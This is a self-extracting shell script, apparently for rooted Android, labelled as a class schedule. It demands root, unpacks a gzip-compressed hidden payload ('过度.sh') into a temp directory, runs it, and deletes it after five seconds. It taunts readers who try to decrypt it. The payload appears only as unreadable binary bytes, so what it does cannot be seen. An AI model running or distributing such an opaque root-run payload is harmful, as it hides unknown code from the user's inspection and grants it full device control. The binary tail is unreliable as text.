#!落泪哥哥
if [ "$(id -u)" != "0" ]; then
echo -e "\033[31m \n\n\n           课程表必须以 ROOT 权限执行\n\n \033[0m" 
   exit 
fi
skip=48
set -e
tab='	'
nl='
'
IFS=" $tab$nl"
umask=`umask`
umask 77
gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15
case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/data/adb/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }
gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }
case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "别看了我都不知道咋解密  其实喊爸爸自动解密 $0"
  (exit 127); res=127
fi; exit $res
��B�c过度.sh KNQ�OI,I���ON���*(��+IS��106N�JM��WP�ɃAu�P6��8����O�x�7���/�=��b���+�_,\��b�����_64<m��|j�˹����{:��i��v�\u�չ�K�rt���rR��g(d��[��g�WT�%����Ċ���3K2J�J�S����JR�J�*�#t}J�}R3A,]]}S3cs�4����S���$ÔscK��43�Tj�yj���>�����n�N���檎�N`C �$.�!�T�b��g�W���

��zѷN��4<���I���(WA�(%� v�Ue��� ���  